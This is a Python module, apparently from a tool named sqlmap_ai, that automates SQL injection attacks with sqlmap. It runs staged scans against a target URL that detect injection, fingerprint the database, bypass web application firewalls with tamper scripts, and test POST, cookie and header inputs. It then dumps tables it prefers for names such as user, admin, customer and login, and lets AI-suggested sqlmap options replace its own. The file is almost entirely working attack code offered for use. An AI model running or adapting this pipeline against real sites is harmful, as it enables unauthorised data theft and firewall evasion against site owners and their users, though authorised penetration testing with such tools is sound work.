import re
import time
from typing import Dict, List, Optional, Tuple, Any
from sqlmap_ai.ui import (
    print_info, 
    print_success, 
    print_warning, 
    print_error,
    get_user_choice
)
from sqlmap_ai.parser import extract_sqlmap_info
from sqlmap_ai.ai_analyzer import ai_suggest_next_steps
class AdaptiveTestingEngine:
    def __init__(self, runner, interactive_mode=False, default_timeout=120, test_parameter=None):
        self.runner = runner
        self.interactive_mode = interactive_mode
        self.default_timeout = default_timeout
        self.scan_history = []
        self.detected_dbms = None
        self.detected_waf = False
        self.vulnerable_params = []
        self.tamper_scripts_used = []
        self.found_databases = []  # Track databases found across all steps
        self.test_parameter = test_parameter  # Specific parameter(s) to test

    def _add_param_option(self, options: List[str]) -> List[str]:
        """Add -p parameter option if specified"""
        if self.test_parameter:
            options.append(f"-p {self.test_parameter}")
        return options

    def run_adaptive_test(self, target_url: str) -> Dict[str, Any]:
        if not self._validate_url(target_url):
            return {
                "success": False, 
                "message": f"Invalid URL format: {target_url}. Please use format like http://example.com/page.php?id=1"
            }
        print_info("🟢 Step 1: Initial Target Assessment")
        print_info("Objective: Check if target is vulnerable to SQL injection")
        initial_result = self._run_step1_assessment(target_url)
        if not initial_result:
            return {"success": False, "message": "Initial assessment failed - no output from SQLMap"}
        if initial_result.startswith("ERROR:") or initial_result.startswith("WARNING:"):
            return {"success": False, "message": initial_result}
        if "TIMEOUT:" in initial_result or "STALLED:" in initial_result:
            if "TIMEOUT:" in initial_result:
                print_warning("Initial assessment timed out. Try increasing the timeout value.")
            else:
                print_warning("Initial assessment stalled. SQLMap might be stuck in a loop.")
            print_info("Attempting fallback with simplified options...")
            fallback_options = ["--batch", "--dbs", "--tech=T", "--time-sec=5", "--threads=8"]
            reduced_timeout = max(self.default_timeout // 2, 60)  
            print_info(f"Using fallback options with reduced timeout of {reduced_timeout} seconds")
            fallback_result = self.runner.run_sqlmap(
                target_url=target_url,
                options=fallback_options,
                timeout=reduced_timeout,
                interactive_mode=self.interactive_mode
            )
            if fallback_result and not (
                fallback_result.startswith("ERROR:") or 
                "TIMEOUT:" in fallback_result or 
                "STALLED:" in fallback_result
            ):
                print_success("Fallback assessment completed!")
                initial_result = fallback_result
            else:
                return {"success": False, "message": "Initial assessment failed with fallback options"}
        initial_info = extract_sqlmap_info(initial_result)
        self.scan_history.append({
            "step": "initial_assessment",
            "command": "sqlmap -u {} --batch --dbs --threads=5".format(target_url),
            "result": initial_info
        })
        if initial_info["databases"]:
            print_success("SQL injection vulnerability confirmed!")
            self.vulnerable_params = initial_info["vulnerable_parameters"]
            self.found_databases = initial_info["databases"]  # Store databases found in Step 1
            if any(db.lower() in ["mysql", "mssql", "oracle", "postgresql"] for db in initial_info["techniques"]):
                self.detected_dbms = next((db for db in initial_info["techniques"]
                                          if db.lower() in ["mysql", "mssql", "oracle", "postgresql"]), None)
                print_success(f"DBMS identified: {self.detected_dbms}")
                step3_result = self._run_step3_dbms_specific(target_url)
                return step3_result
        else:
            print_warning("No databases found in initial scan. Moving to DBMS identification.")
        print_info("🟡 Step 2: Identify the Database Management System (DBMS)")
        print_info("Objective: Identify the DBMS type for targeted attack strategy")
        dbms_result = self._run_step2_identify_dbms(target_url)
        if not dbms_result:
            return {"success": False, "message": "DBMS identification failed - no output from SQLMap"}
        if dbms_result.startswith("ERROR:") or dbms_result.startswith("WARNING:"):
            print_warning(f"DBMS identification issue: {dbms_result}")
            print_warning("Moving to enhanced testing despite identification issue")
            step4_result = self._run_step4_enhanced_testing(target_url)
            return step4_result
        if "TIMEOUT:" in dbms_result:
            print_warning("DBMS identification timed out. Moving to enhanced testing.")
            step4_result = self._run_step4_enhanced_testing(target_url)
            return step4_result
        dbms_info = extract_sqlmap_info(dbms_result)
        self.scan_history.append({
            "step": "identify_dbms",
            "command": "sqlmap -u {} --batch --fingerprint --threads=5".format(target_url),
            "result": dbms_info
        })
        if any(tech.lower() in ["mysql", "mssql", "oracle", "postgresql"] for tech in dbms_info["techniques"]):
            self.detected_dbms = next((tech for tech in dbms_info["techniques"] 
                                     if tech.lower() in ["mysql", "mssql", "oracle", "postgresql"]), None)
            print_success(f"DBMS identified: {self.detected_dbms}")
            step3_result = self._run_step3_dbms_specific(target_url)
            return step3_result
        else:
            print_warning("Could not identify specific DBMS. Moving to enhanced testing.")
            step4_result = self._run_step4_enhanced_testing(target_url)
            return step4_result
    def _validate_url(self, url: str) -> bool:
        if not url or not isinstance(url, str):
            return False
        if not (url.startswith('http://') or url.startswith('https://')):
            return False
        placeholders = ['[TARGET_URL]', '{target}', '<target>', 'example.com']
        if any(ph in url for ph in placeholders):
            return False
        return True
    def _run_step1_assessment(self, target_url: str) -> Optional[str]:
        options = ["--batch", "--dbs", "--threads=5"]
        options = self._add_param_option(options)
        print_info(f"Running initial assessment with {' '.join(options)}")
        result = self.runner.run_sqlmap(
            target_url=target_url,
            options=options,
            timeout=self.default_timeout,
            interactive_mode=self.interactive_mode
        )
        return result
    def _run_step2_identify_dbms(self, target_url: str) -> Optional[str]:
        options = ["--batch", "--fingerprint", "--threads=5"]
        options = self._add_param_option(options)
        print_info(f"Running DBMS fingerprinting with {' '.join(options)}")
        result = self.runner.run_sqlmap(
            target_url=target_url,
            options=options,
            timeout=self.default_timeout,
            interactive_mode=self.interactive_mode
        )
        return result
    def _run_step3_dbms_specific(self, target_url: str) -> Dict[str, Any]:
        print_info(f"🟠 Step 3: Optimized Attack for {self.detected_dbms}")
        print_info(f"Objective: Execute {self.detected_dbms}-specific attack techniques")
        options = ["--batch", f"--dbms={self.detected_dbms.lower()}", "--tables", "--threads=5"]
        if self.detected_dbms.lower() == "mysql":
            print_info("Using MySQL-specific attack options")
        elif self.detected_dbms.lower() == "mssql":
            print_info("Using MSSQL-specific attack options with OS shell capabilities")
            options.extend(["--is-dba", "--technique=BEU"])
        elif self.detected_dbms.lower() == "oracle":
            print_info("Using Oracle-specific attack options")
            options.extend(["--technique=BEU", "--current-user", "--privileges"])
        elif self.detected_dbms.lower() == "postgresql":
            print_info("Using PostgreSQL-specific attack options")
            options.extend(["--technique=BEU", "--schema", "--current-user"])
        result = self.runner.run_sqlmap(
            target_url=target_url,
            options=options,
            timeout=self.default_timeout,
            interactive_mode=self.interactive_mode
        )
        if not result:
            print_warning("DBMS-specific scan failed. Trying more limited options.")
            return self._run_step4_enhanced_testing(target_url)
        if result.startswith("ERROR:") or (result.startswith("WARNING:") and "No parameter(s) found" in result):
            print_warning(f"DBMS-specific scan issue: {result}")
            print_warning("Falling back to more targeted approach")
            limited_options = ["--batch", f"--dbms={self.detected_dbms.lower()}", "--dbs", "--threads=5"]
            limited_result = self.runner.run_sqlmap(
                target_url=target_url,
                options=limited_options,
                timeout=self.default_timeout,
                interactive_mode=self.interactive_mode
            )
            if not limited_result or limited_result.startswith("ERROR:"):
                print_warning("Limited scan also failed. Moving to enhanced testing.")
                return self._run_step4_enhanced_testing(target_url)
            result = limited_result
        dbms_info = extract_sqlmap_info(result)
        databases = dbms_info.get("databases", [])
        # Update found_databases if new ones are discovered
        if databases:
            for db in databases:
                if db not in self.found_databases:
                    self.found_databases.append(db)
        self.scan_history.append({
            "step": "dbms_specific_scan",
            "command": f"sqlmap -u {target_url} --batch --dbms={self.detected_dbms.lower()} --tables --threads=5",
            "result": dbms_info
        })
        # Check if databases exist from any previous step
        if self.found_databases:
            if databases:
                print_success(f"Found {len(databases)} databases")
            else:
                print_info(f"Using {len(self.found_databases)} databases from previous steps")
            tables = dbms_info.get("tables", [])
            if tables:
                print_success(f"Found {len(tables)} tables")
                return self._run_step5_extract_data(target_url, dbms_info)
            else:
                print_info("No tables found. Trying to get tables with --tables option...")
                if len(databases) > 1:
                    app_db = None
                    system_dbs = ['information_schema', 'mysql', 'performance_schema', 'sys', 
                                'master', 'model', 'msdb', 'tempdb', 
                                'postgres', 'template0', 'template1']
                    filtered_dbs = [db for db in databases if db.lower() not in system_dbs]
                    if filtered_dbs:
                        table_options = ["--batch", f"--dbms={self.detected_dbms.lower()}", 
                                        f"-D {filtered_dbs[0]}", "--tables", "--threads=5"]
                        print_info(f"Targeting non-system database: {filtered_dbs[0]}")
                        result = self.runner.run_sqlmap(
                            target_url=target_url,
                            options=table_options,
                            timeout=self.default_timeout,
                            interactive_mode=self.interactive_mode
                        )
                        if result:
                            tables_info = extract_sqlmap_info(result)
                            self.scan_history.append({
                                "step": "table_enumeration",
                                "command": f"sqlmap -u {target_url} --batch --dbms={self.detected_dbms.lower()} -D {filtered_dbs[0]} --tables --threads=5",
                                "result": tables_info
                            })
                            if tables_info.get("tables", []):
                                dbms_info["tables"] = tables_info["tables"]
                                return self._run_step5_extract_data(target_url, dbms_info)
                print_info("No tables found. Trying common table existence check...")
                common_tables_options = ["--batch", f"--dbms={self.detected_dbms.lower()}", "--common-tables", "--threads=8"]
                result = self.runner.run_sqlmap(
                    target_url=target_url,
                    options=common_tables_options,
                    timeout=self.default_timeout,
                    interactive_mode=self.interactive_mode
                )
                if result:
                    common_tables_info = extract_sqlmap_info(result)
                    self.scan_history.append({
                        "step": "common_tables_check",
                        "command": f"sqlmap -u {target_url} --batch --dbms={self.detected_dbms.lower()} --common-tables --threads=8",
                        "result": common_tables_info
                    })
                    if common_tables_info.get("tables", []):
                        dbms_info["tables"] = common_tables_info["tables"]
                        return self._run_step5_extract_data(target_url, dbms_info)
                print_info("Still no tables. Trying to find columns directly...")
                common_columns_options = ["--batch", f"--dbms={self.detected_dbms.lower()}", "--common-columns", "--threads=8"]
                result = self.runner.run_sqlmap(
                    target_url=target_url,
                    options=common_columns_options,
                    timeout=self.default_timeout,
                    interactive_mode=self.interactive_mode
                )
                if result:
                    common_columns_info = extract_sqlmap_info(result)
                    self.scan_history.append({
                        "step": "common_columns_check",
                        "command": f"sqlmap -u {target_url} --batch --dbms={self.detected_dbms.lower()} --common-columns --threads=8",
                        "result": common_columns_info
                    })
                    if common_columns_info.get("columns", {}):
                        dbms_info["columns"] = common_columns_info["columns"]
                        return self._run_step5_extract_data(target_url, dbms_info)
                print_warning("Standard methods failed to find tables. Trying alternative techniques...")
                alt_techniques_options = [
                    "--batch", 
                    f"--dbms={self.detected_dbms.lower()}", 
                    "--tables",
                    "--technique=USE", 
                    "--risk=3", 
                    "--level=5",
                    "--time-sec=2",
                    "--threads=10"
                ]
                alt_techniques_result = self.runner.run_sqlmap(
                    target_url=target_url,
                    options=alt_techniques_options,
                    timeout=self.default_timeout,
                    interactive_mode=self.interactive_mode
                )
                if alt_techniques_result:
                    alt_techniques_info = extract_sqlmap_info(alt_techniques_result)
                    self.scan_history.append({
                        "step": "alternative_techniques",
                        "command": f"sqlmap -u {target_url} --batch --dbms={self.detected_dbms.lower()} --tables --technique=USE --risk=3 --level=5 --threads=10",
                        "result": alt_techniques_info
                    })
                    tables = alt_techniques_info.get("tables", [])
                    if tables:
                        print_success(f"Found {len(tables)} tables using alternative techniques")
                        return self._run_step5_extract_data(target_url, alt_techniques_info)
                print_warning("Could not enumerate tables. Moving to enhanced testing which may bypass protections.")
                enhanced_result = self._run_step4_enhanced_testing(target_url)
                if enhanced_result and not enhanced_result.get("success", False):
                    return {
                        "success": True,
                        "partial": True,
                        "scan_history": self.scan_history,
                        "message": "Found databases but unable to enumerate tables or extract data. "
                                  "The database might be empty or protected against enumeration.",
                        "databases_found": self.found_databases
                    }
                return enhanced_result
        else:
            # This should rarely happen now since we track databases globally
            print_warning("No databases found yet. Moving to enhanced testing.")
            return self._run_step4_enhanced_testing(target_url)
    def _run_step4_enhanced_testing(self, target_url: str) -> Dict[str, Any]:
        print_info("🔴 Step 4: Enhanced Testing")
        print_info("Objective: Try more aggressive techniques to bypass protections")
        if self._check_for_waf(target_url):
            print_warning("Web Application Firewall (WAF) detected! Using bypass techniques...")
            tamper_options = ["--batch", "--dbs", "--risk=3", "--level=5", "--tamper=space2comment,between,randomcase"]
            if self.detected_dbms:
                tamper_options.extend([f"--dbms={self.detected_dbms.lower()}"])
            waf_result = self.runner.run_sqlmap(
                target_url=target_url,
                options=tamper_options,
                timeout=self.default_timeout * 1.5,  
                interactive_mode=self.interactive_mode
            )
            if waf_result and "TIMEOUT:" not in waf_result and "STALLED:" not in waf_result:
                waf_info = extract_sqlmap_info(waf_result)
                self.scan_history.append({
                    "step": "waf_bypass",
                    "command": f"sqlmap -u {target_url} --batch --risk=3 --level=5 --tamper=space2comment,between,randomcase",
                    "result": waf_info
                })
                databases = waf_info.get("databases", [])
                if databases:
                    print_success(f"WAF bypass successful! Found {len(databases)} databases")
                    if not waf_info.get("tables", []):
                        print_info("Attempting to enumerate tables with WAF bypass...")
                        table_tamper_options = ["--batch", "--tables", "--risk=3", "--level=5", 
                                              "--tamper=space2comment,between,randomcase"]
                        if self.detected_dbms:
                            table_tamper_options.extend([f"--dbms={self.detected_dbms.lower()}"])
                        if len(databases) > 1:
                            for db in databases:
                                if db.lower() not in ["information_schema", "mysql", "performance_schema", 
                                                    "sys", "master", "model", "msdb", "tempdb"]:
                                    table_tamper_options.extend(["-D", db])
                                    break
                        table_tamper_result = self.runner.run_sqlmap(
                            target_url=target_url,
                            options=table_tamper_options,
                            timeout=self.default_timeout * 1.5,
                            interactive_mode=self.interactive_mode
                        )
                        if table_tamper_result:
                            table_tamper_info = extract_sqlmap_info(table_tamper_result)
                            self.scan_history.append({
                                "step": "waf_bypass_tables",
                                "command": f"sqlmap -u {target_url} --batch --tables --risk=3 --level=5 --tamper=space2comment,between,randomcase",
                                "result": table_tamper_info
                            })
                            tables = table_tamper_info.get("tables", [])
                            if tables:
                                print_success(f"Successfully enumerated {len(tables)} tables with WAF bypass")
                                waf_info["tables"] = tables  
                                return self._run_step5_extract_data(target_url, waf_info)
                    else:
                        return self._run_step5_extract_data(target_url, waf_info)
        print_info("Trying with increased risk and level settings...")
        high_risk_options = ["--batch", "--dbs", "--risk=3", "--level=5"]
        if self.detected_dbms:
            high_risk_options.extend([f"--dbms={self.detected_dbms.lower()}"])
        high_risk_result = self.runner.run_sqlmap(
            target_url=target_url,
            options=high_risk_options,
            timeout=self.default_timeout,
            interactive_mode=self.interactive_mode
        )
        if high_risk_result and "TIMEOUT:" not in high_risk_result and "STALLED:" not in high_risk_result:
            high_risk_info = extract_sqlmap_info(high_risk_result)
            self.scan_history.append({
                "step": "high_risk_testing",
                "command": f"sqlmap -u {target_url} --batch --risk=3 --level=5",
                "result": high_risk_info
            })
            databases = high_risk_info.get("databases", [])
            if databases:
                print_success(f"High risk testing successful! Found {len(databases)} databases")
                tables = high_risk_info.get("tables", [])
                if tables:
                    print_success(f"Found {len(tables)} tables")
                    return self._run_step5_extract_data(target_url, high_risk_info)
                else:
                    print_info("Attempting to enumerate tables with high risk settings...")
                    table_high_risk_options = ["--batch", "--tables", "--risk=3", "--level=5"]
                    if self.detected_dbms:
                        table_high_risk_options.extend([f"--dbms={self.detected_dbms.lower()}"])
                    if len(databases) > 1:
                        for db in databases:
                            if db.lower() not in ["information_schema", "mysql", "performance_schema", 
                                                "sys", "master", "model", "msdb", "tempdb"]:
                                table_high_risk_options.extend(["-D", db])
                                break
                    table_high_risk_result = self.runner.run_sqlmap(
                        target_url=target_url,
                        options=table_high_risk_options,
                        timeout=self.default_timeout,
                        interactive_mode=self.interactive_mode
                    )
                    if table_high_risk_result:
                        table_high_risk_info = extract_sqlmap_info(table_high_risk_result)
                        self.scan_history.append({
                            "step": "high_risk_tables",
                            "command": f"sqlmap -u {target_url} --batch --tables --risk=3 --level=5",
                            "result": table_high_risk_info
                        })
                        tables = table_high_risk_info.get("tables", [])
                        if tables:
                            print_success(f"Successfully enumerated {len(tables)} tables with high risk settings")
                            high_risk_info["tables"] = tables  
                            return self._run_step5_extract_data(target_url, high_risk_info)
                return {
                    "success": True,
                    "partial": True,
                    "scan_history": self.scan_history,
                    "message": "Found databases but unable to enumerate tables. The database might be empty or protected.",
                    "databases_found": databases
                }
        return {"success": False, "message": "Enhanced testing failed to identify SQL injection vulnerabilities."}
    def _check_for_waf(self, target_url: str) -> bool:
        print_info("Checking for Web Application Firewall (WAF)...")
        waf_result = self.runner.run_sqlmap(
            target_url=target_url,
            options=["--batch", "--identify-waf"],
            timeout=self.default_timeout // 2,  
            interactive_mode=self.interactive_mode
        )
        if waf_result:
            if "WAF/IPS" in waf_result or "firewall" in waf_result.lower():
                self.detected_waf = True
                return True
            if any(indicator in waf_result.lower() for indicator in 
                  ["forbidden", "access denied", "not authorized", "403", "blocked"]):
                self.detected_waf = True
                return True
        test_injection = self.runner.run_sqlmap(
            target_url=target_url,
            options=["--batch", "--technique=B", "--prefix=\"'\"", "--suffix=\"--\"", "--time-sec=1"],
            timeout=self.default_timeout // 2,
            interactive_mode=self.interactive_mode
        )
        if test_injection and any(indicator in test_injection.lower() for indicator in 
                                ["blocked", "rejected", "forbidden", "protection"]):
            self.detected_waf = True
            return True
        return False
    def _select_tamper_scripts(self, waf_output: str) -> List[str]:
        selected_scripts = []
        space_tampers = ["space2comment", "space2plus", "space2randomblank"]
        encoding_tampers = ["base64encode", "charencode", "charunicodeencode"]
        logical_tampers = ["greatest", "between", "symboliclogical"]
        comment_tampers = ["randomcomments", "modsecurityversioned"]
        if "ModSecurity" in waf_output or "Apache" in waf_output:
            selected_scripts.extend(["modsecurityversioned", "space2comment", "randomcomments"])
        elif "Cloudflare" in waf_output:
            selected_scripts.extend(["charencode", "charunicodeencode", "space2randomblank"])
        elif "Imperva" in waf_output:
            selected_scripts.extend(["base64encode", "randomcase", "between"])
        else:
            selected_scripts = ["space2comment", "randomcase", "between", "greatest"]
        return selected_scripts[:4]
    def _get_tables_for_extraction(self, target_url: str, info: Dict[str, Any]) -> Dict[str, Any]:
        if not info["databases"]:
            return {"success": False, "message": "No databases found for extraction"}
        target_db = None
        system_dbs = ["information_schema", "mysql", "sys", "performance_schema", "master", "model", "msdb", "tempdb"]
        for db in info["databases"]:
            if db.lower() not in system_dbs:
                target_db = db
                break
        if not target_db and "information_schema" in info["databases"]:
            target_db = "information_schema"
        elif not target_db and info["databases"]:
            target_db = info["databases"][0]
        if not target_db:
            return {"success": False, "message": "No suitable database found for extraction"}
        print_info(f"Getting tables for database: {target_db}")
        options = ["--batch"]
        if self.detected_dbms:
            options.append(f"--dbms={self.detected_dbms.lower()}")
        if self.tamper_scripts_used:
            options.append(f"--tamper={','.join(self.tamper_scripts_used)}")
        options.extend(["-D", target_db, "--tables"])
        tables_result = self.runner.run_sqlmap(
            target_url=target_url,
            options=options,
            timeout=self.default_timeout,
            interactive_mode=self.interactive_mode
        )
        if not tables_result or "TIMEOUT:" in tables_result:
            return {"success": False, "message": "Failed to get tables or operation timed out"}
        tables_info = extract_sqlmap_info(tables_result)
        info["tables"] = tables_info["tables"]  
        return self._run_step5_extract_data(target_url, info)
    def _run_step5_extract_data(self, target_url: str, info: Dict[str, Any]) -> Dict[str, Any]:
        print_info("🟣 Step 5: Data Extraction")
        print_info("Objective: Extract valuable data from identified tables")
        selected_db = None
        selected_tables = []
        databases = info.get("databases", [])
        if databases:
            for db in databases:
                db_lower = db.lower()
                if any(interesting in db_lower for interesting in ["user", "admin", "account", "customer", "web"]):
                    selected_db = db
                    break
            if not selected_db:
                for db in databases:
                    if db.lower() not in ["information_schema", "mysql", "performance_schema", "sys"]:
                        selected_db = db
                        break
            if not selected_db and databases:
                selected_db = databases[0]
        tables = info.get("tables", [])
        if tables:
            for table in tables:
                table_lower = table.lower()
                if any(interesting in table_lower for interesting in ["user", "admin", "account", "customer", "login", "member", "profile"]):
                    selected_tables.append(table)
            if not selected_tables and tables:
                selected_tables = tables[:min(3, len(tables))]
        options = ["--batch"]
        if selected_db:
            options.append(f"-D {selected_db}")
        if selected_tables:
            extracted_data = {}
            for table in selected_tables:
                print_info(f"Extracting data from table: {table}")
                dump_options = options.copy()
                if selected_db:
                    dump_options.append(f"-T {table}")
                else:
                    dump_options.append(f"-T {table}")
                dump_options.append("--dump")
                if len(self.scan_history) >= 2:
                    current_extracted = extracted_data.copy() if extracted_data else {}
                    ai_options = ai_suggest_next_steps(
                        report=self.scan_history[-1].get("result", {}).get("raw_result", ""),
                        scan_history=self.scan_history,
                        extracted_data=current_extracted
                    )
                    if ai_options:
                        print_success("Using AI-suggested options for optimal extraction:")
                        for opt in ai_options:
                            print_info(f"  {opt}")
                        dump_options = ai_options
                result = self.runner.run_sqlmap(
                    target_url=target_url,
                    options=dump_options,
                    timeout=int(self.default_timeout * 1.5),  
                    interactive_mode=self.interactive_mode
                )
                if not result:
                    print_warning(f"Failed to extract data from table {table}")
                    continue
                dump_info = extract_sqlmap_info(result)
                self.scan_history.append({
                    "step": "data_extraction",
                    "command": f"sqlmap -u {target_url} {' '.join(dump_options)}",
                    "result": dump_info
                })
                if "extracted" in dump_info:
                    for extracted_table, table_data in dump_info["extracted"].items():
                        extracted_data[extracted_table] = table_data
            if extracted_data:
                return {
                    "success": True,
                    "message": f"Successfully extracted data from {len(extracted_data)} tables",
                    "extracted_data": extracted_data,
                    "scan_history": self.scan_history
                }
            else:
                print_warning("No data extracted from specific tables. Trying general extraction.")
                general_options = options.copy()
                ai_options = ai_suggest_next_steps(
                    report=self.scan_history[-1].get("result", {}).get("raw_result", ""),
                    scan_history=self.scan_history,
                    extracted_data={}
                )
                if ai_options:
                    print_success("Using AI-suggested options for general extraction:")
                    for opt in ai_options:
                        print_info(f"  {opt}")
                    general_options = ai_options
                else:
                    if selected_db:
                        general_options.append(f"-D {selected_db}")
                    general_options.append("--dump")
                result = self.runner.run_sqlmap(
                    target_url=target_url,
                    options=general_options,
                    timeout=int(self.default_timeout * 1.5),
                    interactive_mode=self.interactive_mode
                )
                if not result:
                    return {"success": False, "message": "Data extraction failed", "scan_history": self.scan_history}
                general_info = extract_sqlmap_info(result)
                self.scan_history.append({
                    "step": "data_extraction",
                    "command": f"sqlmap -u {target_url} {' '.join(general_options)}",
                    "result": general_info
                })
                if "extracted" in general_info and general_info["extracted"]:
                    return {
                        "success": True,
                        "message": "Successfully extracted data using general extraction",
                        "extracted_data": general_info["extracted"],
                        "scan_history": self.scan_history
                    }
                else:
                    return {
                        "success": False,
                        "message": "Failed to extract data",
                        "scan_history": self.scan_history
                    }
        else:
            general_options = options.copy()
            ai_options = ai_suggest_next_steps(
                report=self.scan_history[-1].get("result", {}).get("raw_result", ""),
                scan_history=self.scan_history,
                extracted_data={}
            )
            if ai_options:
                print_success("Using AI-suggested options for database extraction:")
                for opt in ai_options:
                    print_info(f"  {opt}")
                general_options = ai_options
            else:
                if selected_db:
                    general_options.append(f"-D {selected_db}")
                general_options.append("--tables")
            result = self.runner.run_sqlmap(
                target_url=target_url,
                options=general_options,
                timeout=self.default_timeout,
                interactive_mode=self.interactive_mode
            )
            if not result:
                return {"success": False, "message": "Database table enumeration failed", "scan_history": self.scan_history}
            tables_info = extract_sqlmap_info(result)
            self.scan_history.append({
                "step": "table_enumeration",
                "command": f"sqlmap -u {target_url} {' '.join(general_options)}",
                "result": tables_info
            })
            if "tables" in tables_info and tables_info["tables"]:
                return self._run_step5_extract_data(target_url, tables_info)
            else:
                return {
                    "success": False,
                    "message": "Failed to find any tables to extract data from",
                    "scan_history": self.scan_history
                }
    def _run_step6_alternative_inputs(self, target_url: str) -> Dict[str, Any]:
        print_info("🟡 Step 6: Expanding the Attack Scope (POST, Cookies, Headers)")
        print_info("Objective: Test POST parameters, cookies, and headers")
        results = {}
        methods_tested = []
        print_info("Testing POST parameters")
        methods_tested.append("post")
        form_url = target_url
        if "?" in target_url:
            base_url, params = target_url.split("?", 1)
            form_url = base_url  
            post_options = ["--data", params]
        else:
            post_options = ["--data", "id=1"]
        if self.detected_dbms:
            post_options.append(f"--dbms={self.detected_dbms.lower()}")
        if self.tamper_scripts_used:
            post_options.append(f"--tamper={','.join(self.tamper_scripts_used)}")
        post_options.extend(["--level=5", "--risk=3"])
        print_info(f"Using form URL: {form_url}")
        post_result = self.runner.run_sqlmap(
            target_url=form_url,
            options=post_options,
            timeout=self.default_timeout * 1.5,
            interactive_mode=self.interactive_mode
        )
        if self._check_test_success(post_result, "POST"):
            post_info = extract_sqlmap_info(post_result)
            if post_info["databases"] or post_info["vulnerable_parameters"]:
                print_success("POST parameter injection successful!")
                results["post"] = {
                    "success": True,
                    "info": post_info
                }
                if post_info["databases"]:
                    results["extraction"] = self._run_step5_extract_data(form_url, post_info)
                    return self._prepare_final_results(results, methods_tested)
        print_info("Testing cookie-based injection")
        methods_tested.append("cookie")
        cookie_options = [
            "--cookie", "PHPSESSID=1", "--level=5", "--risk=3"
        ]
        if self.detected_dbms:
            cookie_options.append(f"--dbms={self.detected_dbms.lower()}")
        if self.tamper_scripts_used:
            cookie_options.append(f"--tamper={','.join(self.tamper_scripts_used)}")
        cookie_result = self.runner.run_sqlmap(
            target_url=target_url,
            options=cookie_options,
            timeout=self.default_timeout * 1.5,
            interactive_mode=self.interactive_mode
        )
        if self._check_test_success(cookie_result, "Cookie"):
            cookie_info = extract_sqlmap_info(cookie_result)
            if cookie_info["databases"] or cookie_info["vulnerable_parameters"]:
                print_success("Cookie-based injection successful!")
                results["cookie"] = {
                    "success": True,
                    "info": cookie_info
                }
                if cookie_info["databases"]:
                    results["extraction"] = self._run_step5_extract_data(target_url, cookie_info)
                    return self._prepare_final_results(results, methods_tested)
        print_info("Testing header-based injection")
        methods_tested.append("header")
        header_options = [
            "--headers", "X-Forwarded-For: 1", "--level=5", "--risk=3"
        ]
        if self.detected_dbms:
            header_options.append(f"--dbms={self.detected_dbms.lower()}")
        if self.tamper_scripts_used:
            header_options.append(f"--tamper={','.join(self.tamper_scripts_used)}")
        header_result = self.runner.run_sqlmap(
            target_url=target_url,
            options=header_options,
            timeout=self.default_timeout * 1.5,
            interactive_mode=self.interactive_mode
        )
        if self._check_test_success(header_result, "Header"):
            header_info = extract_sqlmap_info(header_result)
            if header_info["databases"] or header_info["vulnerable_parameters"]:
                print_success("Header-based injection successful!")
                results["header"] = {
                    "success": True,
                    "info": header_info
                }
                if header_info["databases"]:
                    results["extraction"] = self._run_step5_extract_data(target_url, header_info)
                    return self._prepare_final_results(results, methods_tested)
        return self._prepare_final_results(results, methods_tested)
    def _check_test_success(self, result: Optional[str], method_name: str) -> bool:
        if not result:
            print_warning(f"{method_name} test failed - no output from SQLMap")
            return False
        if result.startswith("ERROR:"):
            print_warning(f"{method_name} test error: {result}")
            return False
        if result.startswith("WARNING:"):
            print_warning(f"{method_name} test warning: {result}")
            return True
        if "TIMEOUT:" in result:
            print_warning(f"{method_name} test timed out")
            return False
        return True
    def _prepare_final_results(self, results: Dict[str, Any], methods_tested: List[str]) -> Dict[str, Any]:
        if results:
            result_type = "partial_success" if "extraction" in results else "detected_only"
            self.scan_history.append({
                "step": "alternative_inputs",
                "methods_tested": methods_tested,
                "result": result_type
            })
            return {
                "success": True,
                "message": "One or more alternative input methods were successful",
                "results": results,
                "scan_history": self.scan_history
            }
        else:
            print_warning("All testing methods failed. Target may not be vulnerable.")
            self.scan_history.append({
                "step": "alternative_inputs",
                "methods_tested": methods_tested,
                "result": "all_failed"
            })
            return {
                "success": False,
                "message": "All testing methods failed. Target may not be vulnerable.",
                "scan_history": self.scan_history
            }
def run_adaptive_test_sequence(runner, target_url, interactive_mode=False, timeout=120, test_parameter=None):
    engine = AdaptiveTestingEngine(
        runner=runner,
        interactive_mode=interactive_mode,
        default_timeout=timeout,
        test_parameter=test_parameter
    )
    return engine.run_adaptive_test(target_url) 